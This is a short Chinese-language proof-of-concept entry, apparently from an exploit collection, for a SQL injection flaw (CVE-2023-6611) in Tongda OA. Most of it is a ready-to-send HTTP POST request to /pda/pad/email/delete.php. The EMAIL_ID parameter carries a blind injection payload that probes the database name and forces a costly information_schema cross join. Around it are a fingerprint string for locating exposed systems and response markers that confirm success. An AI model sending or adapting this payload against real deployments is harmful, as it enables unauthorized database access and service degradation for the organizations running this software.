﻿# 通达OA SQL注入漏洞

> 更新时间：2023-12-20

> 漏洞编号：CVE-2023-6611

> 漏洞说明：影响范围：通达OA >= 2017版 通达OA < 11.10

> 漏洞特征：app.name="通达 OA"

> 验证脚本：HTTP

```
POST /pda/pad/email/delete.php HTTP/1.1
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Connection: close
Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=djdn42kbghtfftdtfdcnf663o4; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=6eb35161

EMAIL_ID=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1&A=delbox
```

> 响应代码特征：200

> 响应内容特征：ok

> 上传文件定位：


> 验证文件来源：通达OA SQL注入漏洞.poc
